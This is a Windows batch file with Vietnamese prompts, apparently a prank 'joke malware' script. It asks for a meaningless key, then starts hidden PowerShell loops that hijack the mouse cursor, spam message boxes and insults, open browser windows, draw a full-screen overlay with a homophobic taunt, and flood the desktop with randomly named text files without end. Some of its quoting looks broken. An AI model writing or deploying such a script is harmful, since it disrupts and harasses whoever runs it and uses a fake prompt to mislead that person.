@echo off
set /p key=Key là gì: 

powershell -windowstyle hidden -command ""

start /min powershell -Command "
Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Mouse { [DllImport("user32.dll")] public static extern bool SetCursorPos(int X, int Y); }' -Language CSharp;
while ($true) {
    $x = Get-Random -Minimum 0 -Maximum (Get-WmiObject Win32_DesktopMonitor).ScreenWidth;
    $y = Get-Random -Minimum 0 -Maximum (Get-WmiObject Win32_DesktopMonitor).ScreenHeight;
    [Mouse]::SetCursorPos($x, $y);
    Start-Sleep -Seconds 0.1;
}"

start /min powershell -Command "while ($true) { [System.Windows.MessageBox]::Show('BensGaming On Top', 'Thông báo', 0, 64); }"

start /min powershell -Command "while ($true) { Write-Host 'ngu ngu ngu ngu ngu'; Start-Sleep -Milliseconds 500; }"

start explorer
ping -n 2 127.0.0.1 >nul
start explorer

start https://www.youtube.com/watch?v=PFGCEl9MbBw

powershell -c "(New-Object Media.SoundPlayer 'C:\Windows\Media\Windows Notify System Generic.wav').PlaySync()"

start chrome

start /min powershell -Command "
Add-Type -TypeDefinition 'using System; using System.Drawing; using System.Windows.Forms; public class Overlay : Form { public Overlay() { this.FormBorderStyle = FormBorderStyle.None; this.BackColor = Color.Red; this.TransparencyKey = Color.Red; this.TopMost = true; this.Bounds = Screen.PrimaryScreen.Bounds; Label lbl = new Label(); lbl.Text = \"Your Pc Is Gay\"; lbl.Font = new Font(\"Arial\", 48, FontStyle.Bold); lbl.ForeColor = Color.Red; lbl.AutoSize = true; lbl.Location = new Point((this.Width - lbl.Width) / 2, (this.Height - lbl.Height) / 2); this.Controls.Add(lbl); } } [STAThread] static void Main() { Application.EnableVisualStyles(); Application.Run(new Overlay()); }' -Language CSharp;
[Overlay]::Main()"

start /min powershell -Command "
$desktop = [System.Environment]::GetFolderPath('Desktop');
while ($true) {
    $randomName = -join ((65..90) + (97..122) | Get-Random -Count 10 | % {[char]$_}) + '.txt';
    New-Item -Path "$desktop\$randomName" -ItemType File -Force | Out-Null;
    Start-Sleep -Milliseconds 500;
}
